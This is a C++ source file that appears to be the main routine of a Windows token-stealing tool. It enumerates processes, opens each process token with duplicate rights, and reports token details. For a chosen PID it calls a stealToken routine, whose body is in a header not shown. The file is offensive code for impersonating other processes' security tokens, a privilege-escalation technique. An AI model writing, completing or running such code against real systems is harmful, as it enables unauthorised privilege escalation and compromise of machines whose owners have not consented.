#include "token.h"
#include <unordered_map>

void enumerateProcessess();

int main(int argc, char* argv[])
{
	int pid = 0;
	if (argc == 2)
	{
		pid = std::atoi(argv[1]);
	}

	HANDLE hProcessSnap;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("[-] process snapshot could not be created: %d\n", GetLastError());
		exit(1);
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		printf("[-] failed getting first process\n");
		CloseHandle(hProcessSnap);
		exit(1);
	}

	HANDLE hProcess;
	HANDLE hToken;
	do
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pe32.th32ProcessID);
		if (hProcess)
		{
			if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
			{
				if (pid != 0)
				{
					if (pid == pe32.th32ProcessID)
					{
						printf("[*] obtaining information for pid: %d\n", pid);
						getTokenInformation(hToken);
						getTokenStatistics(hToken);
						getTokenIntegrityLevel(hToken);
						getTokenElevationType(hToken);
						stealToken(hToken);
					}
				}
				else
				{
					wprintf(L"[+] %d->%s: ", pe32.th32ProcessID, pe32.szExeFile);
					getTokenInformation(hToken);
				}
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);

	return 0;
}